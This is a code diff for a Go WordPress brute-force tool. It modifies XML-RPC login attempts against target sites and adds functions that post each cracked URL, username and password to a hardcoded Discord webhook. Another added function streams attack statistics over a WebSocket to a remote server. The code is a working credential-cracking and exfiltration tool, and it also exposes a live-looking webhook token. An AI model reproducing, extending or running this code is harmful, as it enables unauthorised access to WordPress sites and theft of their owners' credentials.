@@ -3,12 +3,16 @@ package main
 import (
 	"bufio"
 	"bytes"
+	"encoding/json"
 	"fmt"
 	"io"
 	"net/http"
 	"os"
 	"strings"
+	"sync"
 	"time"
+
+	"github.com/gorilla/websocket"
 )
 
 // Reads and filters credentials from a file
@@ -156,6 +160,7 @@ func wpbrute(url string, client *http.Client) error {
 				if err != nil {
 					tries++
 				} else {
+					sendDiscordWebhook(url, username, password)
 					// Save working credentials to file
 					f, err := os.OpenFile("good.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
 					if err != nil {
@@ -248,9 +253,7 @@ func connectToWordPress(url, username, password string, client *http.Client) err
 		<methodCall>
 			<methodName>wp.getUsersBlogs</methodName>
 			<params>
-				<param>
-					<value><string></string></value> 
-				</param>
+	
 				<param>
 					<value><string>%s</string></value>
 				</param>
@@ -282,6 +285,7 @@ func connectToWordPress(url, username, password string, client *http.Client) err
 	}
 
 	responseStr := string(body)
+	fmt.Printf("Response: %s\n", responseStr)
 
 	// Check for successful login
 	if strings.Contains(responseStr, "<name>blogid</name>") ||
@@ -302,4 +306,78 @@ func connectToWordPress(url, username, password string, client *http.Client) err
 	}
 
 	return fmt.Errorf("unexpected response")
+}
+
+func connectAndSendStats(wg *sync.WaitGroup) {
+start:
+	defer wg.Done()
+	// Create WebSocket connection
+	c, _, err := websocket.DefaultDialer.Dial(wsURL, nil)
+	if err != nil {
+		fmt.Printf("WebSocket connection error: %v\n", err)
+		time.Sleep(1 * time.Second)
+		goto start
+	}
+	defer c.Close()
+
+	// Send stats every 500ms
+	ticker := time.NewTicker(500 * time.Millisecond)
+	defer ticker.Stop()
+
+	for range ticker.C {
+		stats := map[string]interface{}{
+			"total":     total,
+			"processed": progress,
+			"success":   goods,
+			"failed":    bad,
+			"attempts":  tries,
+			"wordpress": WordPress,
+		}
+
+		// Create a message that includes both the event name and data
+		message := map[string]interface{}{
+			"event": "stats",
+			"data":  stats,
+		}
+
+		err = c.WriteJSON(message)
+		if err != nil {
+			fmt.Printf("Error sending stats data: %v\n", err)
+			time.Sleep(1 * time.Second)
+			goto start
+		}
+	}
+}
+
+func sendDiscordWebhook(url string, username string, password string) error {
+	webhookURL := "https://discord.com/api/webhooks/1342690321787654207/Fhr6sbQ9Rn3cF6NRNwS1FTy71FEHbvedeHMWQBIInRbf7_ORLm1sO1KCOOsxfjQHizf3"
+	if webhookURL == "" {
+		return fmt.Errorf("DISCORD_WEBHOOK_URL environment variable not set")
+	}
+
+	// Create webhook message payload
+	payload := map[string]interface{}{
+		"content":    fmt.Sprintf("🎯 WordPress Login Found!\nURL: %s\nUsername: %s\nPassword: %s", url, username, password),
+		"username":   "WP Brute",
+		"avatar_url": "https://wordpress.org/favicon.ico",
+	}
+
+	// Convert payload to JSON
+	jsonPayload, err := json.Marshal(payload)
+	if err != nil {
+		return fmt.Errorf("error marshaling JSON: %v", err)
+	}
+
+	// Send POST request to Discord webhook
+	resp, err := http.Post(webhookURL, "application/json", bytes.NewBuffer(jsonPayload))
+	if err != nil {
+		return fmt.Errorf("error sending webhook: %v", err)
+	}
+	defer resp.Body.Close()
+
+	if resp.StatusCode != http.StatusNoContent && resp.StatusCode != http.StatusOK {
+		return fmt.Errorf("unexpected status code from Discord: %d", resp.StatusCode)
+	}
+
+	return nil
 }
